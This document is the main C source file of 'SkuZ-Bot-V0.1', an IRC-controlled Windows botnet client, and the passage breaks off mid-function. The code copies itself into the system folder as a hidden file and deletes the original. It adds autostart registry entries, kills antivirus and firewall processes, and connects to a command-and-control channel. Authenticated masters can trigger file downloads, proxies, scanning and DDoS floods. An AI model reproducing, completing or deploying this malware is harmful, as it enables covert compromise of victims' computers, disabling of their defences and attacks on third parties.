#/////////////////////////////////////////////////
//       SkuZ-Bot-V0.1    By Skonk & BuZ       //
///////////////////////////////////////////////// 
#include "Inc.h"
#include "Fun.h"
#include "Conf.h"
#include "Cmd.h"
#include "Pas.h"
#include "Glo.h"
#include "Ext.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	char logbuf[LOGLINE],fname[_MAX_FNAME],ext[_MAX_EXT],rfilename[MAX_PATH],cfilename[MAX_PATH],sysdir[MAX_PATH];

	int i = 0, err = 0;
	DWORD id=0;
	BOOL bkpserver = FALSE;

	#ifndef NO_EHANDLER
	DWORD handler = (DWORD)_except_handler;
    _asm
    {                           
        push    handler         
        push    FS:[0]          
        mov     FS:[0],ESP      
    }
	#endif

	started = GetTickCount() / 1000;
	srand(GetTickCount());

	//#ifdef DEBUG_LOGGING
	//opendebuglog();
	//#endif

	#ifndef NO_CRYPT 
	decryptstrings((sizeof(authost) / sizeof(LPTSTR)), (sizeof(versionlist) / sizeof(LPTSTR)));
	#endif

	LoadDLLs(); 

	fSetErrorMode(SEM_NOGPFAULTERRORBOX);

	if (WaitForSingleObject(CreateMutex(NULL, FALSE, botid), 30000) == WAIT_TIMEOUT)
		ExitProcess(EXIT_FAILURE);

	WSADATA WSAdata;
	if ((err = fWSAStartup(MAKEWORD(2, 2), &WSAdata)) != 0) 
		return 0;
	if (LOBYTE(WSAdata.wVersion) != 2 || HIBYTE(WSAdata.wVersion) != 2 ) {
		fWSACleanup();
		return 0;
	}

	GetSystemDirectory(sysdir, sizeof(sysdir));
	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	_splitpath(cfilename, NULL, NULL, fname, ext);
	_snprintf(rfilename, sizeof(rfilename), "%s%s", fname, ext);

	if (strstr(cfilename, sysdir) == NULL) {
		char tmpfilename[MAX_PATH];
		if (rndfilename) {
			for (i=0;(unsigned int)i < (strlen(filename) - 4);i++)
				filename[i] = (char)((rand() % 26) + 97);
		}
		sprintf(tmpfilename, "%s\\%s", sysdir, filename);

		if (GetFileAttributes(tmpfilename) != INVALID_FILE_ATTRIBUTES)
			SetFileAttributes(tmpfilename,FILE_ATTRIBUTE_NORMAL);

		BOOL bFileCheck=FALSE;
		while (CopyFile(cfilename, tmpfilename, FALSE) == FALSE) {
			DWORD result = GetLastError();

			if (!bFileCheck && (result == ERROR_SHARING_VIOLATION || result == ERROR_ACCESS_DENIED)) {
				bFileCheck=TRUE; 
				Sleep(15000);
			} else
				break; 
		}
		SetFileTime(tmpfilename);
		SetFileAttributes(tmpfilename,FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);

		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&pinfo, 0, sizeof(pinfo));
		memset(&sinfo, 0, sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
		#ifdef DEBUG_CONSOLE
		sinfo.wShowWindow = SW_SHOW;
		#else
		sinfo.wShowWindow = SW_HIDE;
		#endif
		
		char cmdline[MAX_PATH];
		HANDLE hProcessOrig = OpenProcess(SYNCHRONIZE, TRUE, GetCurrentProcessId());
		sprintf(cmdline,"%s %d \"%s\"",tmpfilename, hProcessOrig, cfilename);

		if (CreateProcess(tmpfilename, cmdline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, sysdir, &sinfo, &pinfo)) {
			Sleep(200);
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			fWSACleanup();
			ExitProcess(EXIT_SUCCESS);
		}
	}

	#ifdef DEBUG_CONSOLE
	//OpenConsole();
	//printf("Debugging console enabled.\n\n");
	#endif

	#ifndef NO_MELT
	if (__argc > 2) {
		HANDLE hProcessOrig = (HANDLE) atoi(__argv[1]);
		WaitForSingleObject(hProcessOrig, INFINITE);
		CloseHandle(hProcessOrig);

		if (__argv[2]) {
			Sleep(2000);  
			DeleteFile(__argv[2]);
		}
	}
	#endif

	if ((AutoStart) && !(noadvapi32)) 
		AutoStartRegs(rfilename);

        sprintf(logbuf,"8::[4MaIn8]:: Bot started.");
	addthread(logbuf,MAIN_THREAD,NULL);
	addlog(logbuf);

	memset(aliases, 0, sizeof(aliases));
	addpredefinedaliases();

    #ifndef NO_REGISTRY
	sprintf(logbuf,"8::[4SeCuRe8]:: Registry monitor active.");
	i=addthread(logbuf,KILLER_THREAD,NULL);
	if ((threads[i].tHandle = CreateThread(NULL, 0, &AutoRegistry, (LPVOID)&rfilename, 0, &id)) == NULL)
		sprintf(logbuf,"8::[4SeCuRe8]:: Failed to start registry thread, error: <%d>.", GetLastError());
	addlog(logbuf);
    #endif

    #ifndef NO_AVFW_KILL
	sprintf(logbuf,"8::[4PrOcS8]:: AV/FW Killer active.");
	i=addthread(logbuf,KILLER_THREAD,NULL);
	if ((threads[i].tHandle = CreateThread(NULL, 0, &kill_av, NULL, 0, &id)) == NULL)
		sprintf(logbuf,"8::[4PrOcS8]:: Failed to start AV/FW killer thread, error: <%d>.", GetLastError());
	addlog(logbuf);
    #endif

    #ifndef NO_SECSYSTEM
	sprintf(logbuf,"8::[4SeCuRe8]:: System secure monitor active.");
	i=addthread(logbuf,KILLER_THREAD,NULL);
	if ((threads[i].tHandle = CreateThread(NULL, 0, &AutoSecure, NULL, 0, &id)) == NULL)
		sprintf(logbuf,"8::[4SeCuRe8]:: Failed to start secure thread, error: <%d>.", GetLastError());
	addlog(logbuf);
    #endif

	#ifndef NO_IDENT
	if (findthreadid(IDENT_THREAD) == 0) {
		sprintf(logbuf,"8::[4IdEnTd8]:: Server running on Port: 113."); 
		i = addthread(logbuf,IDENT_THREAD,NULL);
		if ((threads[i].tHandle = CreateThread(NULL, 0, &IdentThread, (LPVOID)i, 0, &id)) == NULL)
			sprintf(logbuf,"8::[4IdEnTd8]:: Failed to start server, error: <%d>.", GetLastError()); 
		addlog(logbuf);
	}
	#endif

    current_version=rand()%(sizeof(versionlist)/sizeof(*versionlist));

	strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
	mainirc.port = port;
	strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
	strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
	mainirc.spy = 0;

	while (1) {
		for (i = 0; i < 6; i++) {
			#ifndef NO_CONNCHECK
			DWORD cstat;
			if (!nowininet) if (fInternetGetConnectedState(&cstat, 0) == FALSE) {
				Sleep(30000);
				continue;
			}
			#endif

			success = FALSE;
			if ((err = irc_connect((LPVOID)&mainirc)) == 2) 
				break; 

			if (success) i--; 

			Sleep(3000);
		}

		if (err == 2) break; 

		if (bkpserver) {
			strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
			mainirc.port = port;
			strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
			bkpserver = FALSE;
		}
		else if (!bkpserver && server2[0] != '\0') {
		    strncpy(mainirc.host, server2, sizeof(mainirc.host)-1);
			mainirc.port = port2;
			strncpy(mainirc.channel, channel2, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass2, sizeof(mainirc.chanpass)-1);
			bkpserver = TRUE;
		}
	}

	killthreadall();
	fWSACleanup();

	return 0;
}

DWORD WINAPI irc_connect(LPVOID param)
{
	SOCKET sock;
	SOCKADDR_IN ssin;

	char *nick1, nickbuf[MAXNICKLEN];

	int rval;

	IRC irc = *((IRC *)param);
	IRC *ircs = (IRC *)param;
	ircs->gotinfo = TRUE;

	while (1) {
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = fhtons((unsigned int)irc.port);
		if ((ssin.sin_addr.s_addr=ResolveAddress(irc.host)) == 0) 
			return 0;

		memset(nickbuf, 0, sizeof(nickbuf));
		nick1 = rndnick(nickbuf, nicktype, nickprefix);
		strncpy(threads[irc.threadnum].nick, nick1, sizeof(threads[irc.threadnum].nick)-1);

		sock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		threads[irc.threadnum].sock = sock;
		if (fconnect(sock, (LPSOCKADDR)&ssin, sizeof(ssin)) == SOCKET_ERROR) {
			fclosesocket(sock);
			FlushDNSCache();
			Sleep(2000);
			continue;
		}

		#ifdef DEBUG_CONSOLE
		printf("Bot started and connect to %s.\n", irc.host);
		#endif
		addlogv("8::[4MaIn8]:: Connected to %s.", irc.host);

		rval = irc_receiveloop(sock, irc.channel, irc.chanpass, nick1, irc.sock, irc.hchan, irc.host, irc.spy);
		fclosesocket(sock);

		if (rval == 0) 
			continue;
		else if (rval == 1) {	
			Sleep(900000);
			continue;
		}
		else if (rval == 2) 
			break;	
	}
	clearthread(irc.threadnum);

	return rval;
}

int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server, int spy)
{
	char buffer[4096], masters[MAXLOGINS][128], *lines[MAX_LINES], str[18], login[128], host[160];
	int i, j, repeat, in_channel=0;

	for (i = 0; i < MAXLOGINS; i++)
		masters[i][0] = '\0';

	if (serverpass[0] != '\0')
		irc_sendv(sock,"PASS %s\r\n",serverpass);

 	sprintf(login, "NICK %s\r\n"
				   "USER %s 0 0 :%s\r\n", nick1, rndnick(str,LETTERNICK, FALSE), nick1);

	#ifdef DEBUG_LOGGING
//	debuglog(login,FALSE);
	#endif

	if (fsend(sock, login, strlen(login), 0) == SOCKET_ERROR) {
		fclosesocket(sock);
		Sleep(5000);
		return 0;
	}

	while(1) {
		memset(buffer, 0, sizeof(buffer));
		if (frecv(sock, buffer, sizeof(buffer), 0) <= 0) 
			break;
		
		i = Split(buffer,&lines);
		for (j=0;j < i;j++) {
			repeat=1;
			do {
				#ifdef DEBUG_LOGGING
				//debuglog(lines[j]);
				#endif

				repeat = irc_parseline(lines[j], sock, channel, chanpass, nick1, server, masters, host, &in_channel, repeat, spy);
				repeat--;

				if (repeat > 0)
					Sleep(FLOOD_DELAY);
			} while (repeat > 0);

			switch (repeat) {
			case -1:
				return 0; 
			case -2:
				return 1; 
			case -3:
				return 2; 
			default:
				break;
			}
		}
	}

	return 0;
}

int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, char masters[][128], char *host, int *in_channel, int repeat, int spy)
{
	char line1[IRCLINE], line2[IRCLINE], sendbuf[IRCLINE],ntmp[12], ntmp2[3];
	char *a[MAXTOKENS], a0[128], nick[MAXNICKLEN], user[24];
	unsigned char parameters[256];

	int i, ii, s=3;
	DWORD id=0;
	BOOL ismaster = FALSE, silent = FALSE, notice = FALSE, usevars = FALSE;
    
	memset(sendbuf, 0, sizeof(sendbuf));

	strncpy(nick, nick1, sizeof(nick)-1);

	if (line == NULL) return 1;
	memset(line1, 0, sizeof(line1));
	strncpy(line1, line, sizeof(line1)-1);
	char *x = strstr(line1, " :");

	strncpy(line2, line1, sizeof(line2)-1);
	a[0] = strtok(line2, " ");
	for (i = 1; i < MAXTOKENS; i++) 
		a[i] = strtok(NULL, " ");

	if (a[0] == NULL || a[1] == NULL) 
		return 1;

	memset(parameters,0,sizeof(parameters));
	for (i=31;i>=0;i--) {
		if (!a[i]) 
			continue;
		if ((a[i][0]=='-') && (a[i][2]==0)) {
			parameters[a[i][1]]=1;
			a[i][0]=0;
			a[i][1]=0;
			a[i][2]=0;
			a[i]=NULL;
		} else 
			break;
	}

	if (parameters['s']) 
		silent=TRUE;
	if (parameters['n']) {
		silent=FALSE;
		notice=TRUE;
	}

	if (a[0][0] != '\n') {
		strncpy(a0,  a[0], sizeof(a0)-1);
		strncpy(user, a[0]+1, sizeof(user)-1);
		strtok(user, "!");
	}

	if (strcmp("PING", a[0]) == 0) {
		a[0][1]='O';

		irc_sendv(sock, "PONG %s\r\n", a[1]);
		if (*in_channel == 0)
			irc_sendv(sock, "JOIN %s %s\r\n", channel, chanpass);

		return 1;
	}

	if (strcmp("001", a[1]) == 0 || strcmp("005", a[1]) == 0) {
		irc_sendv(sock, "USERHOST %s\r\n", nick1); 
		#ifndef NO_MODEONCONN
		irc_sendv(sock, "MODE %s %s\r\n", nick1, modeonconn);
		#else
		irc_sendv(sock, "MODE %s +i\r\n", nick1);
		#endif
		irc_sendv(sock, "JOIN %s %s\r\n", channel, chanpass);
		success = TRUE;
		return 1;
	}

	if (strcmp("302", a[1]) == 0) {
		char *h = strstr(a[3], "@");
		if (h != NULL) 
			strncpy(host,  h+1, 159);
		return 1;
	}
  
	if (strcmp("433", a[1]) == 0) {
		rndnick(nick1, nicktype, nickprefix);
		irc_sendv(sock, "NICK %s\r\n", nick1);
		return 1;
	}

	for (i = 0; i < MAXLOGINS; i++) {
		if (strcmp(masters[i], a0) == 0)
			ismaster = TRUE;
	}

	if (strcmp("KICK", a[1]) == 0) {
		char *knick;
		for (i = 0; i < MAXLOGINS; i++) {
			if (masters[i][0] == '\0') continue;
			strncpy(a0,  masters[i], sizeof(a0)-1);
			knick = user;
			if (knick != NULL && a[3] != NULL) 
				if (strcmp(knick, a[3]) == 0) {
					masters[i][0] = '\0';
					sprintf(sendbuf,"8::[4MaIn8]:: User %s logged out.", knick);
					irc_sendv(sock, "NOTICE %s :%s\r\n", knick, sendbuf);
					addlog(sendbuf);
				}
		}
		if (strcmp(nick1, a[3]) == 0) {
			*in_channel = 0;
			irc_sendv(sock, "JOIN %s %s\r\n", channel, chanpass);
		}
		return 1;
	}

	if (strcmp("NICK", a[1]) == 0) {
		char *oldnck = user, *newnck = a[2] + 1;
		for (i=0;i<MAXLOGINS;i++) {
			if (strcmp(masters[i],a0) == 0) {
				char *identandhost=strchr(a0,'!');
				if (identandhost) {
					masters[i][0]=':';	
					strcpy(&masters[i][1],newnck);
					strcat(&masters[i][2],identandhost);
				}
			}
		}
		if(oldnck != NULL && newnck != NULL) {
			if(strcmp(oldnck, nick1) == 0) {
				strncpy(nick1, newnck, 15);
				return 1;
			}
			char debugbuf[100];
			for (i = 0; i < MAXLOGINS; i++) {
				if(masters[i][0] != '\0' && strcmp(masters[i], a0) == 0) {
					char *ih = strchr(a0, '!');
					if(ih == NULL || strlen(newnck) + strlen(ih) > 126) 
						return 1;
					sprintf(masters[i], ":%s%s", newnck, ih);
					irc_privmsg(sock, channel, debugbuf, FALSE);
					break;
				}
			}
		}

		return 1;
	}

	if (strcmp("PART", a[1]) == 0 || strcmp("QUIT", a[1]) == 0) {
		for (i = 0; i < MAXLOGINS; i++) {
			if (masters[i][0] != '\0') {
				if (strcmp(masters[i], a[0]) == 0) {
					masters[i][0] = '\0';
					sprintf(sendbuf, ".8::[...4MaIn...8]:: User: %s logged out.", user);
					addlog(sendbuf);
					if (strcmp("PART", a[1]) == 0) 
						irc_sendv(sock, "NOTICE %s :%s\r\n", a[0] + 1, sendbuf);
					return 1;
				}
			}
		}
	}

	if (strcmp("353", a[1]) == 0) {
		if (strcmp(channel, a[4]) == 0) 
			*in_channel = 1;
		addlogv(".8::[...4MaIn...8]:: Joined channel: %s.", a[4]);
		return 1;
	}

	if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0 || (strcmp("332", a[1]) == 0 && topiccmd)) {
		if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0) {	
			if (strcmp("NOTICE", a[1]) == 0) 
				notice = TRUE;
			if (a[2] == NULL) return 1;
	
			if (strstr(a[2], "#") == NULL || notice) 
				a[2] = user;

			if (a[3] == NULL) return 1;
			a[3]++;
			if (a[3] && nick1)
				if (strncmp(nick, a[3], strlen(nick)) == 0) 
					s = 4; 
				else 
					s = 3;
			if (a[s] == NULL) return 1;
			if (strcmp("\1VERSION\1", a[s]) == 0) 
				if (a[2][0] != '#' && versionlist[current_version][0] != '\0') {
					irc_sendv(sock, "NOTICE %s :\1VERSION %s\1\r\n", a[2], (char *)versionlist[current_version]);
					return 1;
				}
			else if (strcmp("\1PING", a[s]) == 0) 
				if (a[s+1] != NULL && a[2][0] != '#') {
					irc_sendv(sock, "NOTICE %s :\1PING %s\1\r\n", a[2], a[s+1]);
					return 1;
				}
		} else  { 
			s = 4;
			a[4]++;
			a[2] = a[3];
		}

		#ifndef NO_DCC
		if (strcmp("\1DCC", a[s]) == 0) { 
			if (strcmp("SEND", a[s+1]) == 0) {
				if (ismaster) {
					DCC dcc;
					sprintf(dcc.filename,"%s",a[s+2]);
					sprintf(dcc.host,"%s",a[s+3]);
					dcc.port = atoi(a[s+4]);
					dcc.sock = sock;
					strncpy(dcc.sendto,user,sizeof(dcc.sendto)-1);
					dcc.notice = notice;
					dcc.silent = silent;

					sprintf(sendbuf, ".8::[...4DcC...8]:: Receive file: '%s' from user: %s.", dcc.filename,dcc.sendto);
					dcc.threadnum=addthread(sendbuf,DCC_THREAD,NULL);
					if (threads[dcc.threadnum].tHandle = CreateThread(NULL, 0, &DCCGetThread, (LPVOID)&dcc, 0, &id)) {
						while (dcc.gotinfo == FALSE) 
							Sleep(50);
					} else 
						sprintf(sendbuf,".8::[...4DcC...8]:: Failed to start transfer thread, error: <%d>.", GetLastError());
				} else 
					sprintf(sendbuf, ".8::[...4DcC...8]:: Receive file: '%s' failed from unauthorized user: %s.", a[s+2], user);
				addlog(sendbuf);

				return 1;
			}
			else if (strcmp("CHAT", a[s+1]) == 0) {
				if (ismaster) {
					if (findthreadid(DCCCHAT_THREAD) == 0) {
						DCC dcc;
						sprintf(dcc.host,"%s",a[s+3]);
						dcc.port = atoi(a[s+4]);
						dcc.sock = sock;
						strncpy(dcc.sendto,user,sizeof(dcc.sendto)-1);
						dcc.notice = notice;
						dcc.silent = silent;

						sprintf(sendbuf, ".8::[...4DcC...8]:: Chat from user: %s.", user);
						dcc.threadnum=addthread(sendbuf,DCCCHAT_THREAD,NULL);
						if (threads[dcc.threadnum].tHandle = CreateThread(NULL, 0, &DCCChatThread, (LPVOID)&dcc, 0, &id)) {
							while (dcc.gotinfo == FALSE) 
								Sleep(50);
						} else
							sprintf(sendbuf,".8::[...4DcC...8]:: Failed to start chat thread, error: <%d>.", GetLastError());
					} else
						sprintf(sendbuf,".8::[...4DcC...8]:: Chat already active with user: %s.",user);
				} else
					sprintf(sendbuf,".8::[...4DcC...8]:: Chat failed by unauthorized user: %s.",user);
				addlog(sendbuf);

				return 1;
			}
		} else
		#endif

		if (a[s]++[0] != prefix) 
			return 1;

		#ifdef DEBUG_CRYPT	
		#ifndef NO_CRYPT
		if (strcmp("dump", a[s]) == 0) {
			if (a[s+1]) {
				irc_sendv(sock, "NOTICE %s : Id = '%s'\r\n",user,botid); Sleep(FLOOD_DELAY);
				irc_sendv(sock, "NOTICE %s : Version = '%s'\r\n",user,version); Sleep(FLOOD_DELAY);
				irc_sendv(sock, "NOTICE %s : Server = '%s'\r\n",user,server); Sleep(FLOOD_DELAY);
				irc_sendv(sock, "NOTICE %s : Channel = '%s'\r\n",user,channel); Sleep(FLOOD_DELAY);
				irc_sendv(sock, "NOTICE %s : Nickconst = '%s'\r\n",user,nickconst); Sleep(FLOOD_DELAY);
				irc_sendv(sock, "NOTICE %s : Authost = '%s'\r\n",user,authost[0]);
				irc_sendv(sock, "NOTICE %s : Password(before) = '%s'\r\n",user,password); Sleep(FLOOD_DELAY);
				Crypt(password,strlen(password));
				irc_sendv(sock, "NOTICE %s : Password = '%s'\r\n",user,password); Sleep(FLOOD_DELAY);
				Crypt(password,strlen(password));
				irc_sendv(sock, "NOTICE %s : Password(enc) = '%s'\r\n",user,password); Sleep(FLOOD_DELAY);
				Crypt(a[s+1],strlen(a[s+1]));
				irc_sendv(sock, "NOTICE %s : Password(arg) = '%s'\r\n",user,a[s+1]); Sleep(FLOOD_DELAY);
			}

			return 1;
		}
		#endif
		#endif

		if (strcmp(login_cmd, a[s]) == 0) {
			if (a[s+1] == NULL || ismaster) 
				return 1;

			char *u = strtok(a[0], "!") + 1, *h = strtok(NULL, "\0");
			h = strtok(h, "~");
			#ifndef NO_CRYPT
			Crypt(a[s+1],strlen(a[s+1]),"",0); 
			#endif
			if (strcmp(password, a[s+1]) != 0) {
				irc_sendv(sock, "NOTICE %s :Pass auth failed (%s!%s).\r\n", user, user, h);
				irc_sendv(sock, "NOTICE %s :Your attempt has been logged.\r\n", user);
				sprintf(sendbuf, ".8::[...4MaIn...8]:: *Failed pass auth by: (%s!%s).", u, h);
				addlog(sendbuf);
				return 1; 
			}
	
			BOOL host_ok=FALSE;
			for (i=0;i<(sizeof(authost) / sizeof(LPTSTR));i++) {
			#ifndef NO_WILDCARD
				if (wildcardfit(authost[i], h)) { 
					host_ok = TRUE;
					break;
				}
			#else
				if (strcmp(h, authost[i]) == 0) {
					host_ok = TRUE;
					break;
				}
			#endif
			}
 			if (!host_ok) {
 				irc_sendv(sock, "NOTICE %s :Host Auth failed (%s!%s).\r\n", user, user, h);
 				irc_sendv(sock, "NOTICE %s :Your attempt has been logged.\r\n", user);
 				sprintf(sendbuf, ".8::[...4MaIn...8]:: *Failed host auth by: (%s!%s).", u, h);
 				addlog(sendbuf);
 				return 1;
			}
			for (i = 0; i < MAXLOGINS; i++) {
				if (a[s+1] == NULL) return 1;
				if (masters[i][0] != '\0') continue;
				if (strcmp(password, a[s+1]) == 0) {
					strncpy(masters[i],  a0, 127);
					if (!silent) irc_privmsg(sock, a[2], ".8::[...4MaIn...8]:: Password accepted.", notice);
					addlogv(".8::[...4MaIn...8]:: User: %s logged in.", user);
					break;
				}
			}
			return 1;
		}

		if ((ismaster || strcmp("332", a[1]) == 0) && spy == 0) {
			for (i = 0; i < anum; i++) {
				if (strcmp(aliases[i].name, a[s]) == 0) {
					char *sc = strstr(line, " :");
					if (sc == NULL) return 1;
					sc[2] = prefix;
					sc[3] = prefix;
					strncpy(sc+4, aliases[i].command, 159);

					for (ii=15; ii > 0; ii--) {
						sprintf(ntmp, "$%d-", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii+1] != NULL) {
							x = x + strlen(aliases[i].name);
							if (x != NULL) {
								char *y = strstr(x, a[s+ii]);
								if (y != NULL) replacestr(line, ntmp, y);
							}
						}
						else if (a[s+ii+1] == NULL) {
							strncpy(ntmp2, ntmp, 2);
							ntmp2[2] = '\0';
							replacestr(line, ntmp, ntmp2);
						}
					}

					for (ii=16; ii > 0; ii--){
						sprintf(ntmp, "$%d", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii] != NULL) 
							replacestr(line, ntmp, a[s+ii]);
					}

					usevars = TRUE;
					break;
				}
			}

			if (a[s][0] == prefix || usevars) {
				replacestr(line, "$me", nick1); 
				replacestr(line, "$user", user); 
				replacestr(line, "$chan", a[2]); 
				replacestr(line, "$rndnick", rndnick(ntmp)); 
				replacestr(line, "$server", server); 

				while (strstr(line, "$chr(") != NULL) {
					char *c = strstr(line, "$chr(");
					strncpy(ntmp, c+5, 4);
					strtok(ntmp, ")");
					if (ntmp[0] < 48 || ntmp[0] > 57) 
						strncpy(ntmp, "63", 3);
					if (atoi(ntmp) > 0) 
						ntmp2[0] = (char)atoi(ntmp); 
					else 
						ntmp2[0] = (char)((rand()%96) + 32);
					ntmp2[1] = '\0';
					ii = strlen(ntmp);
					memset(ntmp, 0, sizeof(ntmp));
					strncpy(ntmp, c, ii+6);
					replacestr(line, ntmp, ntmp2);
				}

				strncpy(line1, line, sizeof(line1)-1);
				strncpy(line2, line1, sizeof(line2)-1);
				a[0] = strtok(line2, " ");
				for (i = 1; i < 32; i++) 
					a[i] = strtok(NULL, " ");
				if (a[s] == NULL) 
					return 1;
				a[s] += 3;
			}

			if (strcmp(randomnick_cmd, a[s]) == 0) {
				rndnick(nick, nicktype, ((parameters['p'])?(TRUE):(FALSE)), a[s+1]);
				irc_sendv(sock, "NICK %s\r\n", nick);

				addlogv("8::[4MaIn8]:: Random nick change: %s",nick);

				return repeat;
			}
			else if (strcmp(die_cmd, a[s]) == 0) {
				if (strcmp("332", a[1]) != 0) {
					#ifdef DEBUG_LOGGING
					//closedebuglog();
					#endif
					killthreadall();
					ExitProcess(EXIT_SUCCESS);
				}
			}
			else if (strcmp(logout_cmd, a[s]) == 0) {
				if (a[s+1]) {
					i = atoi(a[s+1]);
					if(i >= 0 && i < MAXLOGINS) {
    					if(masters[i][0] != '\0') {
        					sprintf(sendbuf, "8::[4MaIn8]:: User %s logged out.", masters[i]+1);
        					masters[i][0] = '\0';
        				} else
        					sprintf(sendbuf, "8::[4MaIn8]:: No user logged in at slot: %d.", i);
					} else
						sprintf(sendbuf, "8::[4MaIn8]:: Invalid login slot number: %d.", i);				
				} else {
					for (i = 0; i < MAXLOGINS; i++) 
						if (strcmp(masters[i], a[0]) == 0) {
							masters[i][0] = '\0';
							sprintf(sendbuf, "8::[4MaIn8]:: User %s logged out.", user);
							break;
						}
				}
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#ifndef NO_BOTVERSION
			else if (strcmp(version_cmd, a[s]) == 0) {
				sprintf(sendbuf, "8::[4MaIn8]:: %s", version);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			#endif
			#ifndef NO_SPEEDTEST
			else if (strcmp(speedtest_cmd, a[s]) == 0) {
				DoSpeedTest(sock, a[2], notice);
				return repeat;
			}
			#endif
			#ifndef NO_SECURE
			else if (strcmp(secure_cmd, a[s]) == 0 
				|| strcmp(unsecure_cmd, a[s]) == 0) {
				SECURE secure;
				secure.secure = (strcmp(secure_cmd, a[s]) == 0);
				_snprintf(secure.chan, sizeof(secure.chan), a[2]);
				secure.sock = sock;
				secure.notice = notice;
				secure.silent = silent;

				_snprintf(sendbuf, sizeof(sendbuf),"8::[4SeCuRe8]:: %s system.", ((secure.secure)?("Securing"):("Unsecuring")));
				secure.threadnum = addthread(sendbuf, SECURE_THREAD, NULL);
				if (threads[secure.threadnum].tHandle = CreateThread(NULL, 0, &SecureThread, (LPVOID)&secure, 0, &id)) {
					while (secure.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"8::[4SeCuRe8]:: Failed to start secure thread, error: <%d>.", GetLastError());
				addlog(sendbuf);

				return 1;
			}
			#endif
			#ifndef NO_SOCK4SERV
			else if (strcmp(socks4_cmd, a[s]) == 0) {
				SOCKS4 socks4;
				socks4.port = ((a[s+1])?((atoi(a[s+1])==0)?(socks4port):(atoi(a[s+1]))):(socks4port));
				((a[s+2])?(_snprintf(socks4.userid,sizeof(socks4.userid),a[s+2])):
					((parameters['a'])?(_snprintf(socks4.userid,sizeof(socks4.userid),user)):(socks4.userid[0]='\0')));
				socks4.sock = sock;
				socks4.notice = notice;
				socks4.silent = silent;
				_snprintf(socks4.chan,sizeof(socks4.chan),a[2]);

				sprintf(sendbuf, "8::[4SoCkS48]:: Server started on: %s:%d.", GetIP(sock), socks4.port);
				socks4.threadnum=addthread(sendbuf,SOCKS4_THREAD,NULL);
				if (threads[socks4.threadnum].tHandle = CreateThread(NULL, 0, &Socks4Thread, (LPVOID)&socks4, 0, &id)) {
					while(socks4.gotinfo == FALSE)
						Sleep(50);
				} else
					addlogv("8::[4SoCkS48]:: Failed to start server thread, error: <%d>.", GetLastError());

				return 1;
			}
			else if (strcmp(socks4stop_cmd, a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"8::[4SoCkS48]::","Server",SOCKS4_THREAD,a[s+1]);

				return 1;
			}
			#endif
			#ifndef NO_RLOGIND
			else if (strcmp(rloginstop_cmd, a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"8::[4RlOgInD8]::","Server",RLOGIN_THREAD,a[s+1]);

				return 1;
			}
			#endif
            #ifndef NO_DDOSTOP
			else if (strcmp("ddosstop_cmd",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"[DDoS]","DDoS flood",DDOS_THREAD,a[s+1]);

				return 1;
			}
            #endif
			else if (strcmp(httpstop_cmd, a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"8::[4HtTpD8]::","Server",HTTP_THREAD,a[s+1]);

				return 1;
			}
			else if (strcmp(logstop_cmd, a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"8::[4LoG8]::","Log list",LOG_THREAD,a[s+1]);

				return 1;
			}
			else if (strcmp(redirectstop_cmd, a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"8::[4ReDiReCt8]::","TCP redirect",REDIRECT_THREAD,a[s+1]);

				return 1;
			}
			#ifndef NO_TFTPD
			else if (strcmp(tftpstop_cmd, a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"8::[4TfTp8]::","Server",TFTP_THREAD,a[s+1]);

				return 1;
			}
			#endif
			#ifndef NO_FINDFILE
			else if (strcmp(findfilestop_cmd, a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"8::[4FiNd FiLe8]::","Find file",FIND_THREAD,a[s+1]);

				return 1;
			}
			#endif
			#ifndef NO_PROCESS
			else if (strcmp(procsstop_cmd, a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"8::[4PrOc8]::","Process list",PROC_THREAD,a[s+1]);

				return 1;
			}
			#endif
			else if (strcmp(clonestop_cmd, a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"8::[4ClOnEs8]::","Clone",CLONE_THREAD,a[s+1]);

				return 1;
			}
			else if (strcmp(securestop_cmd, a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"8::[4SeCuRe8]::","Secure",SECURE_THREAD,a[s+1]);

				return 1;
			}
			else if (strcmp(scanstop_cmd, a[s]) == 0) {
